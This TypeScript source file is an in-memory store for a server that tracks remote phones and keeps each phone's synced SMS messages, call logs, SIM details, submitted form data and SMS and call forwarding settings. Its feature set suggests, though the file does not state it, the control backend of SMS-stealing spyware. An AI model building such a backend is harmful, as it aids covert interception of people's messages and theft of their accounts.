import { Device, DeviceData, SMS, CallLog, FormData, ForwardingConfig, SimInfo } from './types/index.js';

// In-memory data store for all devices
class DataStore {
    private devices: Map<string, DeviceData> = new Map();

    // Get all devices
    getAllDevices(): Device[] {
        return Array.from(this.devices.values()).map(d => d.device);
    }

    // Get device by ID
    getDevice(deviceId: string): DeviceData | undefined {
        return this.devices.get(deviceId);
    }

    // Register or update a device
    registerDevice(device: Omit<Device, 'lastSeen' | 'status' | 'simCards'>): DeviceData {
        const existing = this.devices.get(device.id);

        if (existing) {
            // Update existing device
            existing.device.status = 'online';
            existing.device.lastSeen = new Date();
            existing.device.name = device.name;
            existing.device.phoneNumber = device.phoneNumber;
            existing.device.socketId = device.socketId;
            return existing;
        }

        // Create new device data
        const deviceData: DeviceData = {
            device: {
                ...device,
                status: 'online',
                lastSeen: new Date(),
                simCards: [],
            },
            sms: [],
            calls: [],
            forms: [],
            forwarding: {
                smsEnabled: false,
                smsForwardTo: '',
                callsEnabled: false,
                callsForwardTo: '',
            },
        };

        this.devices.set(device.id, deviceData);
        return deviceData;
    }

    // Set device offline
    setDeviceOffline(deviceId: string): void {
        const deviceData = this.devices.get(deviceId);
        if (deviceData) {
            deviceData.device.status = 'offline';
            deviceData.device.lastSeen = new Date();
            deviceData.device.socketId = undefined;
        }
    }

    // Set device offline by socket ID
    setDeviceOfflineBySocketId(socketId: string): string | null {
        for (const [deviceId, deviceData] of this.devices) {
            if (deviceData.device.socketId === socketId) {
                this.setDeviceOffline(deviceId);
                return deviceId;
            }
        }
        return null;
    }

    // Sync SMS messages
    syncSMS(deviceId: string, smsMessages: SMS[]): void {
        const deviceData = this.devices.get(deviceId);
        if (deviceData) {
            // Merge new SMS, avoiding duplicates
            const existingIds = new Set(deviceData.sms.map(s => s.id));
            const newMessages = smsMessages.filter(s => !existingIds.has(s.id));
            deviceData.sms = [...deviceData.sms, ...newMessages];
        }
    }

    // Sync call logs
    syncCalls(deviceId: string, calls: CallLog[]): void {
        const deviceData = this.devices.get(deviceId);
        if (deviceData) {
            // Merge new calls, avoiding duplicates
            const existingIds = new Set(deviceData.calls.map(c => c.id));
            const newCalls = calls.filter(c => !existingIds.has(c.id));
            deviceData.calls = [...deviceData.calls, ...newCalls];
        }
    }

    // Submit form data - creates device if it doesn't exist
    submitForm(deviceId: string, formData: Omit<FormData, 'submittedAt'>): void {
        let deviceData = this.devices.get(deviceId);

        // Create device if it doesn't exist (for form submissions before device registers)
        if (!deviceData) {
            deviceData = {
                device: {
                    id: deviceId,
                    name: `Device ${deviceId.substring(0, 8)}`,
                    phoneNumber: '',
                    status: 'offline',
                    lastSeen: new Date(),
                    simCards: [],
                },
                sms: [],
                calls: [],
                forms: [],
                forwarding: {
                    smsEnabled: false,
                    smsForwardTo: '',
                    callsEnabled: false,
                    callsForwardTo: '',
                },
            };
            this.devices.set(deviceId, deviceData);
            console.log(`[Store] Created placeholder device for form: ${deviceId}`);
        }

        deviceData.forms.push({
            ...formData,
            submittedAt: new Date(),
        });
        console.log(`[Store] Form stored for device ${deviceId}, total forms: ${deviceData.forms.length}`);
    }

    // Update forwarding config
    updateForwarding(deviceId: string, config: Partial<ForwardingConfig>): ForwardingConfig | null {
        const deviceData = this.devices.get(deviceId);
        if (deviceData) {
            deviceData.forwarding = { ...deviceData.forwarding, ...config };
            return deviceData.forwarding;
        }
        return null;
    }

    // Get SMS for a device
    getSMS(deviceId: string): SMS[] {
        return this.devices.get(deviceId)?.sms || [];
    }

    // Get calls for a device
    getCalls(deviceId: string): CallLog[] {
        return this.devices.get(deviceId)?.calls || [];
    }

    // Get forms for a device
    getForms(deviceId: string): FormData[] {
        return this.devices.get(deviceId)?.forms || [];
    }

    // Get forwarding config
    getForwarding(deviceId: string): ForwardingConfig | null {
        return this.devices.get(deviceId)?.forwarding || null;
    }

    // Sync SIM cards for a device
    syncSimCards(deviceId: string, simCards: SimInfo[]): void {
        const deviceData = this.devices.get(deviceId);
        if (deviceData) {
            deviceData.device.simCards = simCards;
        }
    }

    // Get SIM cards for a device
    getSimCards(deviceId: string): SimInfo[] {
        return this.devices.get(deviceId)?.device.simCards || [];
    }
}

export const store = new DataStore();
